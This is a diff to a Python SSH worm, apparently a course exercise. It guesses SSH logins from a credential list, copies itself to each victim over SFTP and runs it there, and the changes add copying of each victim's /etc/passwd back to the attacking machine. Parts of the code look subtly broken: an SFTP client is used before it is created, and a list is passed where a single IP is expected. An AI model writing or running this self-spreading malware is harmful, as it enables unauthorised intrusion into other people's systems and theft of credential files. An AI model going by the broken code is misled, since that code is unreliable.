@@ -16,6 +16,7 @@ credList = [
 ('cpsc', 'cpsc'),
 ]
 
+HostIP=[]
 # The file marking whether the worm should spread
 INFECTED_MARKER_FILE = "/tmp/infected.txt"
 
@@ -60,7 +61,7 @@ def markInfected():
 # @param sshClient - the instance of the SSH client connected
 # to the victim system
 ###############################################################
-def spreadAndExecute(sshClient):
+def spreadAndExecute(sshClient,systemIP1):
 	
 	# This function takes as a parameter 
 	# an instance of the SSH class which
@@ -80,16 +81,31 @@ def spreadAndExecute(sshClient):
 	print("****************inside the spreadAndExecute***********")
 	# MIG: Changed this one to the SFTP client
 	if len(sys.argv) < 2:
+		interface = netifaces.interfaces()
+		systemIP = getMyIP(interface)
 		sftpClient.put("/tmp/replicator_worm.py","/tmp/replicator_worm.py")
+		print("start to copy")
+		#copy attack system
+		sftpClient = sshClient.open_sftp()
+		remotepath = '/etc/passwd'
+		localpath = '/home/passwd_'+systemIP1
+		sftpClient.get(remotepath, localpath)
+
 	else:
 		sftpClient.put("replicator_worm.py","/tmp/replicator_worm.py")
+		print("start to copy1")
+		#copy attack system
+		sftpClient = sshClient.open_sftp()
+		remotepath = '/etc/passwd'
+		localpath = '/home/passwd_'+systemIP1
+		sftpClient.get(remotepath, localpath)
+
 	sshClient.exec_command("chmod a+x /tmp/replicator_worm.py")
 	sshClient.exec_command("python /tmp/replicator_worm.py")
+
 	
-	#copy attack system
-	remotepath = '/etc/passwd'
-        localpath = '/home/passwd_'+Ipaddress
-        sshClient.get(remotepath, localpath)
+	
+	
 	
 
 ############################################################
@@ -130,6 +146,8 @@ def tryCredentials(inHost, userName, password, sshClient):
 	try:
 		sshClient.connect(inHost, username = userName, password = password)
 		print("Got him!", inHost,userName, password)
+		HostIP.append(inHost)
+		print(HostIP)
 		return 0
 	# MIG: Removed this
 	#return 1 if wrong credentials
@@ -352,7 +370,7 @@ for host in attackList:
 			print "The remote system ", sshInfo,  " already contains the infected.txt file"
 		except:
 			print("inside if isInfectedSytem() statement ")
-			spreadAndExecute(sshInfo[0])
+			spreadAndExecute(sshInfo[0],HostIP)
 			print("done infecting")
 			exit()
 			
